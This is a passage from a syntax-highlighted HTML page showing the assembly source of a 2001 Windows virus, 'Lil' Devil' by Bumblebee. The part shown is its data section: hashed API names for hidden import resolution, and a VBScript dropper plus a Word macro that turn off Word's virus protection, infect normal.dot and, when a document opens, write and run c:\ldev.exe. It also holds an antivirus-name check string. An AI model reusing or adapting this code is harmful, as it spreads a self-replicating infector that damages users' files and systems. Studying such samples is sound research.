    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">08eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">06ch</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">00ch</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">08eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">00ch</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">

</span><span class="sc1">; data needed to get APIs</span><span class="sc0">
</span><span class="sc5">FSTAPI</span><span class="sc0">                  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">CrcGetCurrentProcess</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">003690e66h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">_GetCurrentProcess</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcWriteProcessMemory</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00e9bbad5h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">_WriteProcessMemory</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcCreateFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">08c892ddfh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">_CreateFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcMapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0797b49ech</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">_MapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcCreatFileMappingA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">096b2d96ch</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">_CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcUnmapViewOfFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">094524b42h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcCloseHandle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">068624a9dh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">_CloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcGetFileTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">04434e8feh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">_GetFileTime</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcSetFileTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">04b2a3e7dh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">_SetFileTime</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcSetFileAttributesA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">03c19e536h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">_SetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcGetFileAttributesA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0c633d3deh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">_GetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcGetFileSize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ef7d811bh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">_GetFileSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcGetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0fe248274h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">21</span><span class="sc0"> 
</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcGetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ebc6c18bh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcSetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0b2dbd7dch</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">21</span><span class="sc0"> 
</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcWriteFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">021777793h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">_WriteFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcFindFirstFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ae17ebefh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">_FindFirstFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcFindNextFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0aa700106h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">_FindNextFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcFindClose</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0c200be21h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">_FindClose</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Crclstrcat</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00792195bh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">_lstrcat</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcLoadLibraryA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">04134d1adh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">_LoadLibraryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcFreeLibrary</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0afdf191fh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">_FreeLibrary</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CrcGetProcAddress</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffc97c1fh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">_GetProcAddress</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ENDAPI</span><span class="sc0">                  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">; vbs shit:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Creates a word.application object and infects normal.dot with</span><span class="sc0">
</span><span class="sc1">; the file c:\ldev.sys. Also removes some nasty word options.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">vbsdrop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">''' ldev module'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'on error resume next'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'set w=createobject("word.application")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'w.options.virusprotection=0'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'w.options.savenormalprompt=0'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'w.options.confirmconversions=0'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'w.normaltemplate.vbproject.vbcomponents.item(1).codemodule.'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'addfromfile("c:\ldev.sys")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'w.application.quit'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'wscript.quit'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc5">vbsdroplen</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">vbsdrop</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Infects on open document with name != "Devil" (from normal.dot).</span><span class="sc0">
</span><span class="sc1">; Drops c:\ldev.exe and execs with name == "Devil" (from DOC).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">wordmacro</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'private sub document_open()'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">''' ldev module'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'on error resume next'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'set ad=activedocument.vbproject.vbcomponents.item(1)'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'if ad.name &lt;&gt; "Devil" then'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ad.name="Devil"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ad.codemodule.addfromfile("c:\ldev.sys")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'else'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'drop'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ldev=shell("c:\ldev.exe",vbnormalfocus)'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'setattr ("c:\ldev.exe"), 6'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'end if'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'end sub'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'private sub drop()'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'open "c:\ldev.exe" for binary as #1'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc5">wordmacrolen</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">wordmacro</span><span class="sc0">
</span><span class="sc5">closedu</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'close #1'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'end sub'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc5">closedus</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">closedu</span><span class="sc0">

</span><span class="sc5">presub</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'private sub a()'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">endsub</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'end sub'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">letlin</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'bee$='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">chrlin</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'chr$('</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">putlin</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'put #1,,bee$'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">infWord</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; 1st gen infects word</span><span class="sc0">
</span><span class="sc1">; some stringz used</span><span class="sc0">
</span><span class="sc5">seflextractor</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'tractor'</span><span class="sc0">
</span><span class="sc5">seflextractors</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">seflextractor</span><span class="sc0">
</span><span class="sc5">antivirus</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ntivir'</span><span class="sc0">
</span><span class="sc5">antiviruss</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">antivirus</span><span class="sc0">
</span><span class="sc5">tmpfilename</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'\ldevrtl.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vbsfilename</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'\ldevwm.vbs'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">macrofilename</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'c:\ldev.sys'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fndMask</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">shell32dll</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'shell32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">shellexec</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ShellExecuteA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">vEnd</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc1">; virtual data follows (not stored inside the file)</span><span class="sc0">

</span><span class="sc1">; biggah buffer to store the generated wm macro. I know i can alloc</span><span class="sc0">
</span><span class="sc1">; mem but.. why not? Seems to work. Moreover i'm lazy to use</span><span class="sc0">
</span><span class="sc1">; mapped files again or to use other more standard alloc API. ;)</span><span class="sc0">
</span><span class="sc1">; So i did it dirty and nasty hehehe i know you like it this way :D</span><span class="sc0">
</span><span class="sc5">buffer0</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">20000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; huahahaha</span><span class="sc0">

</span><span class="sc5">buffer1</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAXSTRING</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">address</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">names</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">ordinals</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">nexports</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">expcount</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mHnd</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fHnd2</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">find_data</span><span class="sc0">       </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">0</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">findHnd</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fHnd</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mapMem</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fhmap</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fileSize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">epAddr</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fileAttrib</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fileTime0</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fileTime1</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fileTime2</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pad</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fNameAddr</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vVEnd</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">fakeHost</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mbtitle</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'(C) 2001 Bumblebee'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mbtitle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mbmess</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Lil'' Devil activated. Have a nice day.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mbmess</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc9">Ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0">     </span><span class="sc5">inicio</span><span class="sc0">
</span></div></body>
</html>
